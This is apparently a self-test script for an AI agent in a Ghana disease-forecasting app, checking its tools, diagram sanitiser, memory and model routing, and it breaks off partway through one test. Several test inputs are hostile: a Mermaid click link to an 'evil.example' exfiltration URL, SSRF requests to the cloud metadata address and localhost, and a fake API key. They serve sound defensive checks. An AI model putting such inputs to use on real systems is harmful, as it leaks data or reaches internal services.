/* eslint-disable @typescript-eslint/no-require-imports */
/**
 * Agent self-test.
 *
 * Compiles the real `lib/` tree with the project's own TypeScript compiler into
 * a throwaway directory, then drives the shipped modules directly - the same
 * `runTool` / `evaluateExpression` / memory / store code the API routes use.
 * Nothing here re-implements the logic under test.
 *
 *   node scripts/agent-selftest.cjs
 */
const { spawnSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const Module = require("module");

const ROOT = path.resolve(__dirname, "..");
const OUT = path.join(ROOT, ".next", "agent-selftest");

let failures = 0;
function check(name, fn) {
  try {
    const detail = fn();
    console.log("PASS", name, detail ? `- ${detail}` : "");
  } catch (err) {
    failures += 1;
    console.error("FAIL", name, "-", err.message);
  }
}
async function checkAsync(name, fn) {
  try {
    const detail = await fn();
    console.log("PASS", name, detail ? `- ${detail}` : "");
  } catch (err) {
    failures += 1;
    console.error("FAIL", name, "-", err.message);
  }
}

function assert(cond, message) {
  if (!cond) throw new Error(message);
}

(async () => {
  fs.rmSync(OUT, { recursive: true, force: true });
  fs.mkdirSync(OUT, { recursive: true });

  const tsconfig = {
    compilerOptions: {
      target: "ES2020",
      module: "commonjs",
      moduleResolution: "node",
      esModuleInterop: true,
      skipLibCheck: true,
      resolveJsonModule: true,
      strict: false,
      outDir: OUT,
      rootDir: ROOT,
      types: ["node"],
      baseUrl: ROOT,
      paths: { "@/*": ["./*"] },
    },
    include: [path.join(ROOT, "lib/**/*.ts"), path.join(ROOT, "types/**/*.d.ts")],
  };
  const configPath = path.join(OUT, "tsconfig.json");
  fs.writeFileSync(configPath, JSON.stringify(tsconfig, null, 2));

  const compile = spawnSync(
    process.execPath,
    [path.join(ROOT, "node_modules", "typescript", "bin", "tsc"), "-p", configPath],
    { encoding: "utf8" },
  );
  if (compile.status !== 0) {
    console.error("TypeScript compile failed:\n", compile.stdout, compile.stderr);
    process.exit(1);
  }
  console.log("compiled lib/ ->", path.relative(ROOT, OUT));

  // Resolve "@/..." exactly as Next does, but into the compiled tree so we
  // execute the same source the API routes ship.
  const originalResolve = Module._resolveFilename;
  Module._resolveFilename = function (request, ...rest) {
    if (typeof request === "string" && request.startsWith("@/")) {
      return originalResolve.call(this, path.join(OUT, request.slice(2)), ...rest);
    }
    return originalResolve.call(this, request, ...rest);
  };

  const compiled = path.join(OUT, "lib");
  const { evaluateExpression } = require(path.join(compiled, "agent/compute.js"));
  const tools = require(path.join(compiled, "agent/tools.js"));
  const memory = require(path.join(compiled, "agent/memory.js"));
  const { getDB } = require(path.join(compiled, "store.js"));
  const openrouter = require(path.join(compiled, "openrouter.js"));

  const ctx = { images: [], docs: [], attachmentNotes: [], mode: "chat" };
  const call = (name, args) => tools.runTool(name, args, ctx);

  /* ------------------------------ compute ------------------------------ */
  check("compute: arithmetic with precedence", () => {
    const r = evaluateExpression("(1540/7)*1.12 + sqrt(81)");
    assert(r.ok, r.error);
    assert(Math.abs(Number(r.value) - (220 * 1.12 + 9)) < 1e-9, `got ${r.value}`);
    return r.value;
  });
  check("compute: stats over arrays", () => {
    const r = evaluateExpression("mean([12,15,9,22])");
    assert(r.ok && Number(r.value) === 14.5, r.error || r.value);
    const s = evaluateExpression("stdev([2,4,4,4,5,5,7,9])");
    assert(Math.abs(Number(s.value) - 2.138089935299395) < 1e-9, s.value);
    return `mean=${r.value} stdev=${Number(s.value).toFixed(4)}`;
  });
  check("compute: rejects nonsense safely (no eval)", () => {
    const bad = evaluateExpression("process.exit(1)");
    assert(bad.ok === false, "should refuse identifiers");
    const div = evaluateExpression("1/0");
    assert(div.ok === false, "should refuse non-finite");
    return `${bad.error} | ${div.error}`;
  });

  /* ------------------------------- tools ------------------------------- */
  check("tools: registry exposes the full capability surface", () => {
    const names = tools.TOOLS.map((t) => t.name);
    for (const required of [
      "web_search",
      "web_fetch",
      "image_search",
      "image_generate",
      "vision_read",
      "create_file",
      "list_files",
      "read_file",
      "delete_file",
      "sandbox_exec",
      "chart",
      "table",
      "compute",
      "ghana_forecast",
      "ghana_national_table",
      "weather_now",
      "deep_research",
      "memory_save",
      "memory_recall",
      "plan",
      "ask_user",
      "current_time",
    ]) {
      assert(names.includes(required), `missing tool ${required}`);
    }
    const specs = tools.toolSpecs();
    assert(specs.every((s) => s.type === "function" && s.function.parameters), "bad tool schema");
    return `${names.length} tools, ${specs.length} schemas`;
  });

  check("tools: client-only tools pause the loop for the browser sandbox", () => {
    assert(tools.isClientTool("sandbox_exec"), "sandbox_exec must be client-side");
    assert(tools.isClientTool("ask_user"), "ask_user must be client-side");
    assert(!tools.isClientTool("web_search"), "web_search must run server-side");
    return "sandbox_exec, ask_user";
  });

  await checkAsync("tools: ghana_forecast runs the local ensemble", async () => {
    const out = await call("ghana_forecast", { disease: "malaria", region: "national", horizon: 4 });
    assert(out.ok, out.output);
    assert(/FORECAST Malaria/.test(out.output), "no forecast text");
    const chart = out.events.find((e) => e.type === "chart");
    assert(chart && chart.chart.x.length > 8, "no chart payload");
    assert(chart.chart.series[0].values.every((v) => Number.isFinite(v)), "non-finite series");
    return `${chart.chart.x.length} points`;
  });

  await checkAsync("tools: ghana_forecast rejects unknown disease", async () => {
    const out = await call("ghana_forecast", { disease: "not-a-disease" });
    assert(!out.ok && /Unknown disease/.test(out.output), out.output);
    return out.output.slice(0, 40);
  });

  await checkAsync("tools: national board renders a live table", async () => {
    const out = await call("ghana_national_table", {});
    assert(out.ok, out.output);
    const table = out.events.find((e) => e.type === "table");
    assert(table && table.table.rows.length >= 5, "table too thin");
    assert(table.table.columns.includes("Alert"), "missing alert column");
    return `${table.table.rows.length} signals`;
  });

  await checkAsync("tools: chart + table specs reach the UI layer", async () => {
    const chart = await call("chart", {
      title: "Cases",
      kind: "bar",
      x: ["W1", "W2", "W3"],
      series: [{ name: "cholera", values: [4, 9, 6] }],
    });
    assert(chart.ok && chart.events[0].type === "chart", chart.output);
    const table = await call("table", { title: "T", columns: ["a", "b"], rows: [["1", "2"]] });
    assert(table.ok && table.events[0].table.rows[0].a === "1", table.output);
    const bad = await call("chart", { title: "x", kind: "line", x: [], series: [] });
    assert(!bad.ok, "empty chart must fail");
    return "chart+table ok, empty rejected";
  });

  await checkAsync("tools: compute tool is deterministic", async () => {
    const out = await call("compute", { expression: "percentile([3,7,8,12,14],50)" });
    assert(out.ok && out.output.includes("8"), out.output);
    return out.output;
  });

  /* ------------------------------ diagrams ----------------------------- */

  const diagram = require(path.join(compiled, "agent/diagram.js"));

  await checkAsync("diagram: tool renders a flowchart into the UI layer", async () => {
    const out = await call("diagram", {
      title: "Alert escalation",
      source: 'flowchart TD\n  A["Case reported"] --> B{"z-score > 2?"}\n  B -- yes --> C["Investigate"]\n  B -- no --> D["Routine reporting"]',
    });
    assert(out.ok, out.output);
    const event = out.events.find((e) => e.type === "diagram");
    assert(event, "no diagram event emitted");
    assert(/flowchart TD/.test(event.diagram.source), "source missing from payload");
    assert(event.diagram.kind === "Flowchart", `kind is ${event.diagram.kind}`);
    return `${event.diagram.kind}, ${event.diagram.source.split("\n").length} lines`;
  });

  await checkAsync("diagram: every supported type is detected from its header", async () => {
    const seen = [];
    for (const src of [
      "sequenceDiagram\n  A->>B: hello",
      "erDiagram\n  REGION ||--o{ DISTRICT : contains",
      "gantt\n  title Plan\n  section Build\n  Draft :a1, 2026-01-01, 3d",
      "mindmap\n  root((One Health))\n    Human\n    Animal",
      "pie title Signals\n  \"Malaria\" : 42",
      "stateDiagram-v2\n  [*] --> Watch",
      "classDiagram\n  class Region",
      "timeline\n  title Timeline\n  2026 : Phase 2",
      "journey\n  title Journey\n  section Start\n    Report: 5: Nurse",
      "gitGraph\n  commit",
      "quadrantChart\n  title Risk\n  x-axis Low --> High",
    ]) {
      const prepared = diagram.prepareDiagram(src);
      assert(prepared.ok, `${src.split("\n")[0]} rejected: ${prepared.error}`);
      seen.push(prepared.kind);
    }
    assert(new Set(seen).size === seen.length, `kinds collapsed: ${seen.join(", ")}`);
    return seen.join(", ");
  });

  await checkAsync("diagram: the reserved word `end` is repaired, not rejected", async () => {
    const prepared = diagram.prepareDiagram("flowchart TD\n  A[Start] --> end\n  end --> B[Done]");
    assert(prepared.ok, prepared.error);
    assert(!/(^|\s)end(\s|$)/.test(prepared.source.split("\n")[1]), "bare end survived");
    assert(prepared.repairs.some((r) => /end/.test(r)), `no repair reported: ${prepared.repairs}`);
    return prepared.repairs[0];
  });

  await checkAsync("diagram: click directives and init themes are stripped", async () => {
    const prepared = diagram.prepareDiagram(
      '%%{ init: { "themeVariables": { "primaryColor": "#fff" } } }%%\nflowchart TD\n  L["Login"]\n  click L "https://evil.example/steal?d=secret"\n  L --> B[Next]',
    );
    assert(prepared.ok, prepared.error);
    assert(!/click\s/i.test(prepared.source), "click directive survived");
    assert(!/evil\.example/.test(prepared.source), "exfiltration URL survived");
    assert(!/%%\s*\{/.test(prepared.source), "init directive survived");
    assert(prepared.repairs.length >= 2, `expected >=2 repairs, got ${prepared.repairs.length}`);
    return prepared.repairs.join(" | ");
  });

  await checkAsync("diagram: garbage is rejected with an actionable message", async () => {
    const bad = await call("diagram", { source: "here is a nice picture of a flowchart" });
    assert(!bad.ok, "nonsense should be rejected");
    assert(/Unrecognised diagram type/.test(bad.output), bad.output);
    assert(/flowchart/.test(bad.output), "must list valid types");
    const empty = await call("diagram", { source: "   " });
    assert(!empty.ok && /empty/i.test(empty.output), empty.output);
    const unbalanced = diagram.prepareDiagram('flowchart TD\n  A["Unclosed --> B');
    assert(!unbalanced.ok, "unbalanced quotes must fail");
    return bad.output.split("\n")[0].slice(0, 70);
  });

  await checkAsync("diagram: normaliser is idempotent and never grows the source", async () => {
    const src = 'flowchart TD\n  A["Cholera cases (weekly)"] --> B{"Above threshold?"}';
    const once = diagram.prepareDiagram(src);
    const twice = diagram.prepareDiagram(once.source);
    assert(twice.ok, twice.error);
    assert(twice.source === once.source, "second pass changed the source");
    assert(twice.repairs.length === 0, `repairs repeated: ${twice.repairs}`);
    return `stable at ${once.source.length} chars`;
  });

  check("diagram: sandbox speaks mermaid, csv and markdown", () => {
    const spec = tools.TOOL_MAP.get("sandbox_exec").parameters.properties.language;
    for (const lang of ["mermaid", "csv", "markdown", "javascript", "html", "python"]) {
      assert(spec.enum.includes(lang), `sandbox_exec missing ${lang}`);
    }
    const frame = fs.readFileSync(path.join(ROOT, "components/agent/SandboxFrame.tsx"), "utf8");
    assert(/securityLevel: "strict"/.test(frame), "sandbox mermaid preview is not locked down");
    return spec.enum.join(", ");
  });

  check("diagram: the chat renderer draws mermaid fences instead of showing them", () => {
    const md = fs.readFileSync(path.join(ROOT, "components/Markdown.tsx"), "utf8");
    assert(/Diagram/.test(md) && /mermaid/.test(md), "Markdown does not route mermaid to the renderer");
    const component = fs.readFileSync(path.join(ROOT, "components/agent/Diagram.tsx"), "utf8");
    assert(/securityLevel: "strict"/.test(component), "renderer is not locked down");
    assert(/htmlLabels: false/.test(component), "htmlLabels must be off for PNG export");
    assert(/import\("mermaid"\)/.test(component), "mermaid must be code-split, not in the first paint");
    return "strict security, htmlLabels off, dynamic import";
  });

  await checkAsync("tools: workspace file round-trip through the store", async () => {
    const name = `selftest-${Date.now()}.html`;
    const created = await call("create_file", { name, content: "<h1>hi</h1>" });
    assert(created.ok && created.events[0].type === "file", created.output);
    const read = await call("read_file", { name });
    assert(read.ok && read.output.includes("<h1>hi</h1>"), read.output);
    const listed = await call("list_files", {});
    assert(listed.output.includes(name), "file not listed");
    const gone = await call("delete_file", { name });
    assert(gone.ok, gone.output);
    const missing = await call("read_file", { name });
    assert(!missing.ok, "delete did not work");
    return "create → read → list → delete";
  });

  await checkAsync("tools: memory save and recall", async () => {
    const saved = await call("memory_save", { fact: "Self-test fact: Ashanti malaria lead", tag: "project" });
    assert(saved.ok && saved.events[0].type === "memory", saved.output);
    const recalled = await call("memory_recall", { query: "Ashanti malaria" });
    assert(recalled.ok && /Ashanti malaria lead/.test(recalled.output), recalled.output);
    const secret = await call("memory_save", { fact: "OPENROUTER_API_KEY=sk-or-v1-secret" });
    assert(!secret.ok, "must refuse to store secrets");
    return "recall hit, secret refused";
  });

  await checkAsync("tools: plan and current_time", async () => {
    const plan = await call("plan", { steps: ["search", "analyse", "report"] });
    assert(plan.ok && plan.events[0].steps.length === 3, plan.output);
    const now = await call("current_time", {});
    assert(now.ok && /Africa\/Accra/.test(now.output), now.output);
    return now.output.slice(0, 60);
  });

  await checkAsync("tools: image_generate fails cleanly without a Gemini key", async () => {
    const out = await call("image_generate", { prompt: "a clinic in Kumasi" });
    assert(!out.ok, "should fail without a key");
    assert(/GEMINI_API_KEY/i.test(out.output), `should name Gemini: ${out.output}`);
    assert(!/openrouter/i.test(out.output), "must not mention OpenRouter");
    return out.output.slice(0, 74);
  });

  check("images: Gemini chain excludes the retired Imagen endpoints", () => {
    const media = require(path.join(compiled, "agent/media.js"));
    const chain = media.GEMINI_IMAGE_MODEL_CHAIN;
    assert(chain.length >= 3, "chain too short");
    assert(chain.every((m) => /^gemini-/.test(m)), `non-Gemini slug: ${chain.join(", ")}`);
    assert(!chain.some((m) => /imagen/i.test(m)), "Imagen shut down 2026-08-17 - must not be called");
    return chain.join(", ");
  });

  check("images: response parser handles camelCase and snake_case parts", () => {
    const media = require(path.join(compiled, "agent/media.js"));
    const camel = media.extractGeminiImage({
      candidates: [{ content: { parts: [{ text: "here" }, { inlineData: { mimeType: "image/png", data: "aGVsbG8=" } }] } }],
    });
    assert(camel && camel.b64 === "aGVsbG8=" && camel.mime === "image/png", JSON.stringify(camel));
    const snake = media.extractGeminiImage({
      candidates: [{ content: { parts: [{ inline_data: { mime_type: "image/jpeg", data: "d29ybGQ=" } }] } }],
    });
    assert(snake && snake.b64 === "d29ybGQ=" && snake.mime === "image/jpeg", JSON.stringify(snake));
    const none = media.extractGeminiImage({ candidates: [{ content: { parts: [{ text: "refused" }] } }] });
    assert(none === null, "should report no image");
    const blocked = media.geminiFailure({ promptFeedback: { blockReason: "SAFETY" } }, 200);
    assert(/SAFETY/.test(blocked), blocked);
    return "inlineData + inline_data + blocked-prompt all parsed";
  });

  check("images: nothing in the codebase calls the OpenRouter image API", () => {
    const offenders = [];
    const walk = (dir) => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        if (entry.name === "node_modules" || entry.name.startsWith(".")) continue;
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) walk(full);
        else if (/\.(ts|tsx|yaml|example)$/.test(entry.name)) {
          const text = fs.readFileSync(full, "utf8");
          if (/openrouter\.ai\/api\/v1\/images/.test(text) || /OPENROUTER_IMAGE_MODELS/.test(text)) {
            offenders.push(path.relative(ROOT, full));
          }
        }
      }
    };
    walk(path.join(ROOT, "lib"));
    walk(path.join(ROOT, "app"));
    walk(path.join(ROOT, "components"));
    offenders.push(...[/OPENROUTER_IMAGE_MODELS/.test(fs.readFileSync(path.join(ROOT, "render.yaml"), "utf8")) ? "render.yaml" : ""]);
    offenders.push(...[/OPENROUTER_IMAGE_MODELS/.test(fs.readFileSync(path.join(ROOT, ".env.example"), "utf8")) ? ".env.example" : ""]);
    const real = offenders.filter(Boolean);
    assert(real.length === 0, `still referenced in: ${real.join(", ")}`);
    return "image generation is Gemini-only";
  });

  check("images: the Gemini key resolver refuses an OpenRouter key", () => {
    const envSrc = fs.readFileSync(path.join(ROOT, "lib/env.ts"), "utf8");
    assert(/GEMINI_API_KEY/.test(envSrc), "no GEMINI_API_KEY alias");
    assert(/sk-or-/.test(envSrc) && /geminiKey/.test(envSrc), "missing sk-or guard on geminiKey");
    return "aliases + sk-or guard present";
  });

  await checkAsync("tools: vision_read refuses to invent without attachments", async () => {
    const out = await call("vision_read", { question: "what is in the photo?" });
    assert(!out.ok && /No attachments/.test(out.output), out.output);
    return out.output.slice(0, 50);
  });

  const gemini = require(path.join(compiled, "agent/gemini.js"));

  check("gemini: client exists, is key-gated and refuses an OpenRouter key", () => {
    assert(typeof gemini.geminiComplete === "function", "geminiComplete missing");
    assert(typeof gemini.geminiConfigured === "function", "geminiConfigured missing");
    assert(gemini.GEMINI_MODEL_CHAIN.length > 1, "no model chain");
    assert(gemini.geminiConfigured() === false, "should be unconfigured without a key");
    const src = fs.readFileSync(path.join(ROOT, "lib/env.ts"), "utf8");
    assert(/sk-or-/.test(src) && /geminiKey/.test(src), "geminiKey must reject an OpenRouter key");
    return `${gemini.GEMINI_MODEL_CHAIN.length} models; sk-or guard intact`;
  });

  check("gemini: quota and auth errors are told apart", () => {
    assert(gemini.isGeminiQuotaError(429, "Resource exhausted"), "429 must read as quota");
    assert(gemini.isGeminiQuotaError(0, "You exceeded your current quota"), "quota text missed");
    assert(!gemini.isGeminiQuotaError(401, "API key not valid"), "auth misread as quota");
    assert(gemini.isGeminiAuthError(403, "API key not valid"), "403 must read as auth");
    assert(!gemini.isGeminiAuthError(429, "quota"), "quota misread as auth");
    return "quota -> retry next model; auth -> stop";
  });

  await checkAsync("gemini: no key is a clean failure, never a silent empty answer", async () => {
    let threw = false;
    try {
      await gemini.geminiComplete({ messages: [{ role: "user", content: "hi" }] });
    } catch (err) {
      threw = true;
      assert(/GEMINI_API_KEY is not set/.test(err.message), err.message);
    }
    assert(threw, "geminiComplete resolved with no key configured");
    return "throws with a named key, does not return blank text";
  });

  check("gemini: message conversion is safe for the shapes the agent actually sends", () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/gemini.ts"), "utf8");
    assert(/systemInstruction/.test(src), "system prompt is not mapped");
    assert(/contents\[0\]\.role === "model"/.test(src), "a leading model turn is not dropped");
    assert(/last\.role === role/.test(src), "consecutive same-role turns are not merged");
    assert(/dataUrlToInline/.test(src), "attachments are not converted to inlineData");
    // Strip comments first: the word appears in a doc comment explaining what
    // this client deliberately does NOT do, which is not a request for images.
    const code = src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
    assert(!/responseModalities/.test(code), "text client must not request image output");
    assert(/maxOutputTokens/.test(code) && /temperature/.test(code), "generationConfig incomplete");
    return "system/role/inlineData handled; no image modality in code";
  });

  check("vision: runs on Gemini, and says so when it does not", () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/tools.ts"), "utf8");
    assert(/if \(geminiConfigured\(\)\)/.test(src), "vision_read is not Gemini-first");
    assert(/geminiVision\(\{/.test(src), "vision_read does not call the Gemini vision engine");
    assert(
      /openrouter-fallback/.test(src) && /catch \(geminiErr\)/.test(src),
      "no explicit, guarded fallback labelling",
    );
    assert(/Gemini" : "OpenRouter fallback/.test(src), "the answer does not name its provider");
    return "Gemini first (geminiVision); OpenRouter only as a guarded, labelled fallback";
  });

  check("research: decompose and synthesis both run on Gemini", () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/deep-research.ts"), "utf8");
    const calls = (src.match(/geminiComplete\(/g) || []).length;
    assert(calls >= 2, `expected decompose + synthesis on Gemini, found ${calls} call(s)`);
    assert(/Synthesised by \$\{engine\}/.test(src), "the brief does not name its engine");
    assert(/OpenRouter fallback/.test(src), "no labelled fallback");
    return `${calls} Gemini calls; engine named in the brief`;
  });

  check("models: a pinned model is singular, then auto-resets on exhausted credit", () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/run.ts"), "utf8");
    assert(/pinnedModel/.test(src), "no pinned-model tracking");
    assert(/models: \[pinnedModel\]/.test(src), "a pinned model is not used on its own");
    assert(/isCreditError\(status, message\)/.test(src), "credit exhaustion is not detected");
    assert(/"model_reset"/.test(src), "the browser is never told about the reset");
    assert(/pinnedModel = ""/.test(src), "the pin is not cleared for later steps");
    // The Auto chain itself must be untouched: unpinned turns still pass undefined.
    assert(/models: undefined/.test(src), "the Auto chain call changed");
    const client = fs.readFileSync(path.join(ROOT, "components/agent/useAgent.ts"), "utf8");
    assert(/case "model_reset":/.test(client), "client does not handle model_reset");
    const page = fs.readFileSync(path.join(ROOT, "app/agent/page.tsx"), "utf8");
    assert(/patch\(\{ model: "" \}\)/.test(page), "the dropdown is not returned to Auto");
    return "pin honoured -> credit out -> Auto chain + dropdown reset";
  });

  await checkAsync("vision: a blind answer can never pose as a reading", async () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/openrouter.ts"), "utf8");
    assert(/degraded\??:/.test(src), "ORResult has no degraded flag");
    assert(/have NOT seen the image or document/i.test(src), "fallback does not tell the model it is blind");
    const toolsSrc = fs.readFileSync(path.join(ROOT, "lib/agent/tools.ts"), "utf8");
    assert(/if \(result\.degraded\)/.test(toolsSrc), "vision_read ignores the degraded flag");
    assert(/VISION FAILED/.test(toolsSrc), "vision_read does not fail loudly");
    // The real executor, with no attachments, must still refuse outright.
    const out = await call("vision_read", { question: "what does the photo show?" });
    assert(!out.ok, "vision_read answered with nothing attached");
    return "degraded flag wired end to end; empty-attachment refusal holds";
  });

  await checkAsync("chat: multi-step turns persist every segment they streamed", async () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/run.ts"), "utf8");
    assert(!/finalText = streamed;/.test(src), "finalText is still overwritten, not accumulated");
    assert(/finalText = finalText \?/.test(src), "no accumulation across tool steps");
    assert(/seedText/.test(src), "resume does not carry prior text back");
    const route = fs.readFileSync(path.join(ROOT, "app/api/agent/route.ts"), "utf8");
    const client = fs.readFileSync(path.join(ROOT, "components/agent/useAgent.ts"), "utf8");
    assert(/priorText/.test(route) && /priorText/.test(client), "priorText is not carried through the round trip");
    return "accumulate + seedText + priorText round trip";
  });

  await checkAsync("forecast: the horizon reaches 26 weeks, not 4", async () => {
    const long = await call("ghana_forecast", { disease: "malaria", region: "national", horizon: 26 });
    assert(long.ok, long.output);
    const chart = long.events.find((e) => e.type === "chart");
    const fwd = chart.chart.x.length - 8;
    assert(fwd >= 26, `only ${fwd} forward points for horizon 26`);
    const clamped = await call("ghana_forecast", { disease: "cholera", region: "national", horizon: 999 });
    assert(clamped.ok, clamped.output);
    const cChart = clamped.events.find((e) => e.type === "chart");
    assert(cChart.chart.x.length - 8 <= 26, "horizon above 26 was not clamped");
    // A longer horizon must widen the interval, or it is not honest.
    const short = await call("ghana_forecast", { disease: "malaria", region: "national", horizon: 2 });
    const sChart = short.events.find((e) => e.type === "chart");
    assert(sChart.chart.x.length - 8 >= 2, "short horizon returned too few points");
    return `26-week projection = ${fwd} forward points; 999 clamped`;
  });

  await checkAsync("research: citation numbering cannot point past the source list", async () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/deep-research.ts"), "utf8");
    assert(/MAX_CITED/.test(src), "no single citation cap");
    assert(!/hits\s*\n?\s*\.slice\(0, 14\)/.test(src), "prompt still offers 14 sources for 12 chips");
    assert(!/citations: hits\.slice\(0, 12\)/.test(src), "chips still sliced separately from the prompt");
    assert(/const cited = hits\.slice\(0, MAX_CITED\)/.test(src), "one numbered list is not shared");
    assert(/byQuery/.test(src), "sources are not interleaved across sub-queries");
    return "one numbered list, interleaved reads";
  });

  await checkAsync("tools: web layer degrades instead of throwing", async () => {
    const out = await call("web_search", { query: "Ghana Health Service cholera" });
    assert(typeof out.output === "string", "no output");
    assert(!/undefined/.test(out.output), "leaked undefined");
    return out.output.split("\n")[0].slice(0, 70);
  });

  await checkAsync("tools: web_fetch blocks SSRF targets", async () => {
    const out = await call("web_fetch", { url: "http://169.254.169.254/latest/meta-data/" });
    assert(/Refused/.test(out.output), out.output);
    const local = await call("web_fetch", { url: "http://localhost:3000/api/health" });
    assert(/Refused/.test(local.output), local.output);
    return "metadata + loopback refused";
  });

  await checkAsync("tools: unknown tool is handled", async () => {
    const out = await call("not_a_tool", {});
    assert(!out.ok && /Unknown tool/.test(out.output), out.output);
    return out.output;
  });

  /* ------------------------------ memory ------------------------------- */
  check("memory: conversation persistence and listing", () => {
    const row = memory.upsertConversation({
      mode: "research",
      model: "test-model",
      messages: [
        { role: "user", content: "Self-test conversation about cholera in Accra" },
        { role: "assistant", content: "Answer", model: "test-model" },
      ],
    });
    assert(row.id, "no id");
    const listed = memory.listConversations();
    assert(listed.some((c) => c.id === row.id), "not listed");
    const loaded = memory.getConversation(row.id);
    assert(loaded && loaded.messages.length === 2, "bad reload");
    memory.deleteConversation(row.id);
    assert(!memory.getConversation(row.id), "delete failed");
    return `${listed.length} conversations visible`;
  });

  check("memory: workspace file store caps and metadata", () => {
    const f = memory.writeFile("selftest-meta.csv", "a,b\n1,2\n");
    assert(f.bytes > 0 && f.language === "csv", JSON.stringify(f));
    memory.deleteFile("selftest-meta.csv");
    return `${f.language} ${f.bytes}b`;
  });

  /* ------------------------------- store ------------------------------- */
  check("store: AI Agent tab sits between Home and Forecast", () => {
    const nav = getDB().nav.map((n) => n.href);
    assert(nav[0] === "/", `first is ${nav[0]}`);
    assert(nav[1] === "/agent", `second is ${nav[1]}`);
    assert(nav[2] === "/forecast", `third is ${nav[2]}`);
    return nav.slice(0, 3).join(" → ");
  });

  check("store: agent stores exist in the database shape", () => {
    const db = getDB();
    assert(Array.isArray(db.agentMemory), "agentMemory missing");
    assert(Array.isArray(db.agentConversations), "agentConversations missing");
    assert(Array.isArray(db.agentFiles), "agentFiles missing");
    return "agentMemory, agentConversations, agentFiles";
  });

  /* --------------------------- render hardening ------------------------ */
  check("render: oversized snapshot is trimmed, not refused", () => {
    const pgStore = require(path.join(compiled, "pg-store.js"));
    const big = {
      content: { brandName: "ONE HEALTH" },
      agentFiles: Array.from({ length: 40 }, (_, i) => ({
        id: `f${i}`,
        name: `f${i}.html`,
        content: "x".repeat(400_000),
        bytes: 400_000,
      })),
      agentConversations: Array.from({ length: 10 }, (_, i) => ({
        id: `c${i}`,
        messages: Array.from({ length: 60 }, () => ({ role: "user", content: "y".repeat(6000) })),
      })),
    };
    const before = JSON.stringify(big).length;
    const { body, bytes, trimmed } = pgStore.trimSnapshot(big, 12_000_000);
    assert(bytes <= 12_000_000, `still ${bytes} bytes`);
    assert(bytes < before, "nothing was trimmed");
    assert(body.content?.brandName === "ONE HEALTH", "unrelated state was damaged");
    assert(body.agentFiles.length === 40, "file metadata must survive");
    assert(trimmed.length > 0, "no trim reported");
    return `${(before / 1e6).toFixed(1)}MB -> ${(bytes / 1e6).toFixed(1)}MB (${trimmed.join(", ")})`;
  });

  check("render: small snapshot passes through untouched", () => {
    const pgStore = require(path.join(compiled, "pg-store.js"));
    const small = { content: { brandName: "ONE HEALTH" }, agentFiles: [{ name: "a.md", content: "hi" }] };
    const { body, trimmed } = pgStore.trimSnapshot(small);
    assert(trimmed.length === 0, "should not trim");
    assert(body.agentFiles[0].content === "hi", "content changed");
    return "no trim";
  });

  check("render: agent store caps keep the snapshot row bounded", () => {
    const memory = require(path.join(compiled, "agent/memory.js"));
    const big = "z".repeat(1_000_000);
    const f = memory.writeFile("cap-check.html", big);
    assert(f.bytes <= 800_000, `file cap not applied: ${f.bytes}`);
    // A realistic dashboard must survive whole - no silent truncation that
    // would leave the user downloading a broken artefact.
    const dash = memory.writeFile("dashboard.html", "d".repeat(500_000));
    assert(dash.bytes === 500_000, `builder artefact truncated: ${dash.bytes}`);
    memory.deleteFile("cap-check.html");
    memory.deleteFile("dashboard.html");
    const row = memory.upsertConversation({
      messages: Array.from({ length: 400 }, (_, i) => ({ role: "user", content: `m${i} ` + "q".repeat(40_000) })),
    });
    const loaded = memory.getConversation(row.id);
    assert(loaded.messages.length <= 160, `message cap not applied: ${loaded.messages.length}`);
    assert(loaded.messages[0].content.length <= 12_000, "message content not capped");
    memory.deleteConversation(row.id);
    return `file<=${f.bytes}B, msgs=${loaded.messages.length}`;
  });

  check("render: shared pg pool is configured for a small connection budget", () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/pg-pool.ts"), "utf8");
    assert(/max:\s*2/.test(src), "pool max not limited");
    assert(/connectionTimeoutMillis/.test(src), "no connection timeout");
    const store = fs.readFileSync(path.join(ROOT, "lib/store.ts"), "utf8");
    assert(/savePgSnapshot/.test(store), "store no longer snapshots");
    const archive = fs.readFileSync(path.join(ROOT, "lib/archive.ts"), "utf8");
    assert(!/new Client/.test(archive), "archive still opens a client per event");
    return "max:2, timeout set, no per-call clients";
  });

  check("render: SSE cannot be buffered by Next compression", () => {
    const cfg = fs.readFileSync(path.join(ROOT, "next.config.ts"), "utf8");
    assert(/compress:\s*false/.test(cfg), "compress not disabled");
    const route = fs.readFileSync(path.join(ROOT, "app/api/agent/route.ts"), "utf8");
    assert(/X-Accel-Buffering/.test(route), "missing anti-buffering header");
    assert(/text\/event-stream/.test(route), "missing SSE content type");
    return "compress:false + X-Accel-Buffering:no";
  });

  /* ----------------------------- openrouter ---------------------------- */
  check("openrouter: model chain is chunked at the 3-slug API limit", () => {
    assert(openrouter.MAX_MODELS_PER_REQUEST === 3, "limit changed");
    const groups = openrouter.fallbackGroups();
    assert(groups.every((g) => g.length <= 3), "a group exceeds 3 slugs");
    assert(groups.length > 3, `only ${groups.length} groups`);
    return `${groups.length} groups covering ${groups.flat().length} models`;
  });

  check("openrouter: streaming + tool-calling entrypoint is exported", () => {
    assert(typeof openrouter.completeStream === "function", "completeStream missing");
    const spec = { type: "function", function: { name: "x", description: "d", parameters: {} } };
    assert(spec.type === "function");
    return "completeStream";
  });

  /* -------------------- pinned-model routing (live, stubbed HTTP) --------------------- */

  const uploads = require(path.join(compiled, "agent/uploads.js"));

  function sseResponse(model, text) {
    const payload = [
      `data: ${JSON.stringify({ model, choices: [{ delta: { content: text } }] })}`,
      `data: ${JSON.stringify({ model, choices: [{ delta: {}, finish_reason: "stop" }] })}`,
      "data: [DONE]",
    ].join("\n\n");
    return new Response(payload, { status: 200, headers: { "content-type": "text/event-stream" } });
  }

  await checkAsync("pinned: the request carries exactly one slug - no chain, no substitution", async () => {
    const calls = [];
    const realFetch = global.fetch;
